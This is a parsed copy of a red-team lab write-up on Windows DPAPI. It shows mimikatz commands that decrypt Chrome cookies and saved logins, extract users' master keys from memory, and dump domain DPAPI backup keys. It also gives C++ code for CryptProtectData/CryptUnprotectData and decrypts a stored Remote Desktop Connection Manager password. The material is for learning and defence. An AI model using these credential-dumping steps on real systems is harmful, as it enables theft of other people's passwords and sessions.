---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Reading DPAPI Encrypted Secrets with Mimikatz and C++

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-reading-dpapi-encrypted-secrets-with-mimikatz-and-c` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Reading DPAPI Encrypted Secrets with Mimikatz and C++](../../topics/offensive-security/reading-dpapi-encrypted-secrets-with-mimikatz-and-c.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-credential-access-and-credential-dumping-reading-dpapi-encrypted-secrets-with-mimikatz-and-c |
| name | Reading DPAPI Encrypted Secrets with Mimikatz and C++ |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++.md |

## Preserved Source Material

````yaml
_asset_filenames:
- Screenshot from 2019-04-13 15-31-49.png
- Screenshot from 2019-04-13 15-34-29.png
- Screenshot from 2019-04-13 15-42-36.png
- Screenshot from 2019-04-13 15-43-02.png
- Screenshot from 2019-04-13 15-55-38.png
- Screenshot from 2019-04-13 16-03-34.png
- Screenshot from 2019-04-13 16-05-55.png
- Screenshot from 2019-04-13 16-57-55.png
- Screenshot from 2019-04-13 17-11-48.png
- Screenshot from 2019-04-13 17-16-47.png
- Screenshot from 2019-04-13 18-02-42.png
- Screenshot from 2019-04-13 20-30-47.png
- Screenshot from 2019-04-13 20-31-58.png
- Screenshot from 2019-04-13 21-21-26.png
- Screenshot from 2019-04-17 19-45-00.png
- Screenshot from 2019-04-17 19-45-47.png
- Screenshot from 2019-04-17 19-52-36.png
- Screenshot from 2019-04-17 19-58-54.png
- Screenshot from 2019-04-17 20-05-04.png
_body: "# Reading DPAPI Encrypted Secrets with Mimikatz and C++\n\nThis lab is based on the article posted by [harmj0y](https://twitter.com/harmj0y)\
  \ [https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/](https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/).\
  \ The aim is to get a bit more familiar with DPAPI, explore some of the mimikatz capabilities related to DPAPI and also\
  \ play around with DPAPI in Windows development environment in C++.\n\nBig shout out to [@harmj0y](https://twitter.com/harmj0y)\
  \ for that I constantly find myself landing on his amazing blog posts and [@gentilkiwi](https://twitter.com/gentilkiwi)\
  \ for giving this world mimikatz.&#x20;\n\n## Overview\n\n* DPAPI stands for Data Protection API.\n* DPAPI for the sake\
  \ of this lab contains 2 functions - for encrypting (`CryptProtectData`) and decrypting (`CryptUnprotectData`) data.\n*\
  \ Created to help developers that know little about cryptography make their programs better at securing users' data.\n*\
  \ Encrypts secrets like wifi passwords, vpn, IE, Chrome, RDP, etc.\n* Transparent to end users - programs (i.e Chrome use\
  \ the two APIs) with user's master key which is based on the user's actual logon password.\n\n## Reading Chrome Cookies\
  \ and Login Data\n\nIf you have compromised as system and run under a particular user's context, you can decrypt their DPAPI\
  \ secrets without knowing their logon password easily with mimikatz.\n\nIn this case - let's check user's Google Chrome\
  \ cookies for a currently logged on user:\n\n{% code title=\"attacker@victim\" %}\n```csharp\ndpapi::chrome /in:\"%localappdata%\\\
  Google\\Chrome\\User Data\\Default\\Cookies\"\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-13\
  \ 15-31-49.png>)\n\nOr Chrome's saved credentials:\n\n{% code title=\"attacker@victim\" %}\n```csharp\ndpapi::chrome /in:\"\
  %localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-04-13 15-34-29.png>)\n\n## Protecting and Unprotecting Data\n\nUsing mimikatz, we can easily encrypt any data\
  \ that will only be accessible to currently logged on user (unless a bad admin comes by - more on this later):\n\n{% code\
  \ title=\"\" %}\n```csharp\ndpapi::protect /data:\"spotless\"\n```\n{% endcode %}\n\n![text \"spotless\" encrypted into\
  \ a blob of bytes](<../../.gitbook/assets/Screenshot from 2019-04-13 15-42-36.png>)\n\nLet's copy/paste the blob into a\
  \ new file in HxD and save it as `spotless.bin`. To decrypt it while running under `mantvydas` user context:\n\n```csharp\n\
  dpapi::blob /in:\"c:\\users\\mantvydas\\desktop\\spotless.bin\" /unprotect\n```\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-04-13 15-43-02.png>)\n\n## Decrypting Other User's Secrets\n\nIf you compromised a system and you see that there\
  \ are other users on the system, you can attempt reading their secrets, but you will not be able to do so since you do not\
  \ have their DPAPI master key, yet.\n\nLet's try reading user's `spotless` chrome secrets while running as a local admin:\n\
  \n{% code title=\"attacker@victim\" %}\n```csharp\ndpapi::chrome /in:\"c:\\users\\spotless.offense\\appdata\\local\\Google\\\
  Chrome\\User Data\\Default\\Login Data\" /unprotect\n```\n{% endcode %}\n\nAs mentioned, we see an error message suggesting\
  \ `CryptUnprotectData` is having some issues decrypting the requested secrets:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-04-13 15-55-38.png>)\n\nIf you escalated privilges, you can try looking for the master key in memory:\n\n{%\
  \ code title=\"attacker@victim\" %}\n```\nsekurlsa::dpapi\n```\n{% endcode %}\n\nWe see there is the master key for user\
  \ `spotless`:\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-13 16-03-34.png>)\n\nLet's now use that master key for\
  \ `spotless` to decrypt those Chrome secrets we could not earlier:\n\n{% code title=\"attacker@victim\" %}\n```csharp\n\
  dpapi::chrome /in:\"c:\\users\\spotless.offense\\appdata\\local\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect\
  \ /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6\n\
  ```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-13 16-05-55.png>)\n\nAdditionally, note that if\
  \ the user is not logged on, but you have their password, just spawn a process with their creds and repeat the above steps\
  \ to retrieve their secrets.\n\n### Retrieving MasterKey with User's Password\n\nSame could be achieved if user's SID, their\
  \ logon password and master key's GUIDs are known:\n\n{% code title=\"attacker@victim\" %}\n```csharp\ndpapi::masterkey\
  \ /in:\"C:\\Users\\spotless.OFFENSE\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2552734371-813931464-1050690807-1106\\\
  3e90dd9e-f901-40a1-b691-84d7f647b8fe\" /sid:S-1-5-21-2552734371-813931464-1050690807-1106 /password:123456 /protected\n\
  ```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-13 18-02-42.png>)\n\n## Extracting DPAPI Backup\
  \ Keys with Domain Admin\n\nIt's possible to extract DPAPI backup keys from the Domain Controller that will enable us to\
  \ decrypt any user's master key which in turn will allow us to decrypt users' secrets.\n\nWhile running as a `Domain Admin`,\
  \ let's dump the DPAPI backup keys:\n\n{% code title=\"attacker@victim\" %}\n```csharp\nlsadump::backupkeys /system:dc01.offense.local\
  \ /export\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-13 16-57-55.png>)\n\nUsing the retrieved\
  \ backup key, let's decrypt user's `spotless` master key:\n\n{% code title=\"attacker@victim\" %}\n```csharp\ndpapi::masterkey\
  \ /in:\"C:\\Users\\spotless.OFFENSE\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2552734371-813931464-1050690807-1106\\\
  3e90dd9e-f901-40a1-b691-84d7f647b8fe\" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk\n```\n{% endcode %}\n\n\
  ![](<../../.gitbook/assets/Screenshot from 2019-04-13 17-11-48.png>)\n\nWe can now decrypt user's `spotless` chrome secrets\
  \ using their decrypted master key:\n\n{% code title=\"attacker@victim\" %}\n```csharp\ndpapi::chrome /in:\"c:\\users\\\
  spotless.offense\\appdata\\local\\Google\\Chrome\\User Data\\Default\\Login Data\" /masterkey:b5e313e344527c0ec4e016f419fe7457f2deaad500f68baf48b19eb0b8bc265a0669d6db2bddec7a557ee1d92bcb2f43fbf05c7aa87c7902453d5293d99ad5d6\n\
  ```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-13 17-16-47.png>)\n\n## Using DPAPIs to Encrypt\
  \ / Decrypt Data in C++\n\n### CryptProtectData\n\nThe below code will use `CryptProtectData` to encrypt a set of bytes\
  \ that represent a string `spotless`and write the encrypted blob to the file on the disk:\n\n```cpp\n#include \"pch.h\"\n\
  #include <iostream>\n#include <Windows.h>\n#include <dpapi.h>\n\nint main()\n{\n\tDATA_BLOB plainBlob = { 0 };\n\tDATA_BLOB\
  \ encryptedBlob = { 0 };\n\tBYTE dataBytes[] = \"spotless\";\n\tHANDLE outFile = CreateFile(L\"c:\\\\users\\\\mantvydas\\\
  \\desktop\\\\encrypted.bin\", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n\t\n\tplainBlob.pbData\
  \ = dataBytes;\n\tplainBlob.cbData = sizeof(dataBytes);\n\t\n\tCryptProtectData(&plainBlob, NULL, NULL, NULL, NULL, CRYPTPROTECT_LOCAL_MACHINE,\
  \ &encryptedBlob);\n\tWriteFile(outFile, encryptedBlob.pbData, encryptedBlob.cbData, NULL, NULL);\n\n\treturn 0;\n}\n```\n\
  \nBelow is a comparison between the blobs for the data `spotless` created with mimikatz and my c++:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-04-13 20-30-47.png>)\n\nWe can now try to decrypt our binary blob file using mimikatz as we did earlier with:\n\
  \n```csharp\ndpapi::blob /in:\"c:\\users\\mantvydas\\desktop\\encrypted.bin\" /unprotect\n```\n\n\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-04-13 20-31-58.png>)\n\nWe can see the decryption produced the following output:\n\n{% code title=\"decryptedBlob\"\
  \ %}\n```csharp\n73 70 6f 74 6c 65 73 73 00\n```\n{% endcode %}\n\n...which is `spotless`, represented in bytes.\n\n###\
  \ CryptUnprotectData\n\nWe can now try to decrypt the data blob we created with mimikatz earlier when we encrypted the \
  \ string `spotless`\n\nWe will use the updated code :\n\n```cpp\n#include \"pch.h\"\n#include <iostream>\n#include <Windows.h>\n\
  #include <dpapi.h>\n\nint main()\n{\n\tDATA_BLOB plainBlob = { 0 };\n\tDATA_BLOB encryptedBlob = { 0 };\n\tBYTE dataBytes[]\
  \ = \"spotless\";\n\tBYTE inBytes[300] = {0};\n\tBYTE outBytes[300] = {0};\n\tHANDLE outFile = CreateFile(L\"c:\\\\users\\\
  \\mantvydas\\\\desktop\\\\encrypted.bin\", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n\tHANDLE\
  \ inFile = CreateFile(L\"c:\\\\users\\\\mantvydas\\\\desktop\\\\spotless.bin\", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,\
  \ NULL);\n\tDWORD fileSize = 0; \n\n\t//encrypt\n\tplainBlob.pbData = dataBytes;\n\tplainBlob.cbData = sizeof(dataBytes);\n\
  \tCryptProtectData(&plainBlob, NULL, NULL, NULL, NULL, CRYPTPROTECT_LOCAL_MACHINE, &encryptedBlob);\n\tWriteFile(outFile,\
  \ encryptedBlob.pbData, encryptedBlob.cbData, NULL, NULL);\n\t\n\t//decrypt\n\tfileSize = GetFileSize(inFile, NULL);\n\t\
  ReadFile(inFile, encryptedBlob.pbData, fileSize , NULL, NULL);\n\tencryptedBlob.cbData = fileSize;\n\tCryptUnprotectData(&encryptedBlob,\
  \ NULL, NULL, NULL, NULL, 0, &plainBlob);\n\n\treturn 0;\n}\n```\n\nWe can see that the decryption was successful:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-04-13 21-21-26.png>)\n\n### Decrypting Remote Desktop Connection Manager Passwords from .rdg\n\nIt's possible\
  \ to decrypt passwords from an .rdg file that is used by Remote Desktop Connection Manager and below shows the process.\n\
  \nI have saved one connection to `DC01.offense.local` using credentials `offense\\administrator` with a password `123456`\
  \ (RDCMan for security reasons show a more than 6 start in the picture) into a file `spotless.rdg`:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-04-17 19-45-00.png>)\n\nIf we look at he `spotless.rdg`, we can see one our admin credentials stored (username\
  \ in plaintext) and the password in base64:\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-17 19-45-47.png>)\n\n\
  Let's decode the base64:\n\n```csharp\necho AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAA0odLHavOPUOnyENNv8ru+gAAAAACAAAAAAAQZgAAAAEAACAAAACVZ0Qg0gf+sYztEiGlD1BfhlJkEmdgMhBdOLXDGNkPvAAAAAAOgAAAAAIAACAAAADiIyAzYqd2zcv5OBNhfxv0v2BwxM4gsJpWfvmmTMxdGRAAAAC8dwNLyhgFHZwGdEVZ5aRIQAAAAPUIoCdUz0vCV7WtgBeEwBumpcqXJ++CJOxBRQGtRLpY7TjDL5tIvdWqVR62oqXNsG4QwCRrusnhECgxzjE4HEU=\
  \ | base64 -d | hexdump -C\n```\n\nBelow shows a binary blob from `spotless.bin` we played with earlier (top screen) and\
  \ the decoded base64 string (bottom screen). Note how the first 62 bytes match - this is a clear giveaway that the .rdg\
  \ password is encrypted using DPAPI:\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-17 19-52-36.png>)\n\nLet's copy\
  \ the hex bytes of the decoded base64 string found in `spotless.rdg` and save it as a binary file `spotless.rdg.bin` and\
  \ try to decode it using the code we played with earlier:\n\n![](<../../.gitbook/assets/Screenshot from 2019-04-17 19-58-54.png>)\n\
  \nWe can see that we were able to successfully decrypt the RDP password stored in `spotless.rdg`:\n\n![](<../../.gitbook/assets/Screenshot\
  \ from 2019-04-17 20-05-04.png>)\n\nSame technique could be used to decrypt Chrome's cookies/logins, wifi passwords and\
  \ whatever else Windows stores encrypted with DPAPI.\n\nNote that this exercise using C++ was possible because DPAPI uses\
  \ currently logged on user's credentials to encrypt/decrypt the data. If we wanted to decrypt a blob encrypted by another\
  \ user, we would need to revert to the previous tactics (using mimikatz) since this C++ code does not deal with other users'\
  \ master keys.\n\nA good way to enumerate DPAPI goodies on a compromised system is to use harmj0y's [SeatBelt](https://github.com/GhostPack/Seatbelt/commit/5b3e69c16cc1668622a0e666162b35cb9f7243ca).\n\
  \n## References\n\n{% embed url=\"https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/\"\
  \ %}\n\n{% embed url=\"https://www.dsinternals.com/en/retrieving-dpapi-backup-keys-from-active-directory/\" %}\n\n{% embed\
  \ url=\"https://www.harmj0y.net/blog/redteaming/offensive-encrypted-data-storage-dpapi-edition/\" %}\n\n{% embed url=\"\
  https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf\" %}"
_relative_path: offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++.md
````
